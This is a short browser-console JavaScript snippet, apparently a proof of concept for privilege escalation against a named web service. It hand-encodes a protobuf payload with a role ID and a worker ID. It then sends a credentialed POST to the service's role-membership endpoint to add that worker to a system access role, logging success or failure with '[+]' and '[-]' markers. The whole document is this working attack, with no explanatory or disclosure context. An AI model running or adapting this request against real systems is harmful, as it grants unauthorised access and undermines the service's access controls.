(() => {
  const ROLE_ID   = "a27e35e7-5253-40db-8be5-c69b9c5ae452";
  const WORKER_ID = "3521111f-b629-4e1e-8377-ea74e4338490";

  const encVarint = (n) => {
    const out = [];
    while (true) {
      const b = n & 0x7f;
      n >>>= 7;
      if (n) out.push(b | 0x80);
      else { out.push(b); break; }
    }
    return out;
  };

  const encString = (field, value) => {
    const bytes = new TextEncoder().encode(value);
    const tag = (field << 3) | 2;
    return [...encVarint(tag), ...encVarint(bytes.length), ...bytes];
  };

  const body = new Uint8Array([
    ...encString(1, ROLE_ID),
    ...encString(2, WORKER_ID),
  ]);

  fetch("https://federacy.haystack.so/api/v1/system_access/role/member/add", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-protobuf",
      "Accept": "application/json, text/plain, */*",
      "X-Client-Type": "web",
      "X-Client-Timezone": "Asia/Kolkata",
      "X-Os": "macos",
      "Sso-Provider": "EMAIL",
      "Authorization": "Bearer EMAIL-TOKEN-IS-IN-SESSION-COOKIE",
    },
    body,
  })
    .then((r) => r.text().then((t) => console.log("[+]", r.status, t)))
    .catch((e) => console.error("[-]", e));
})();
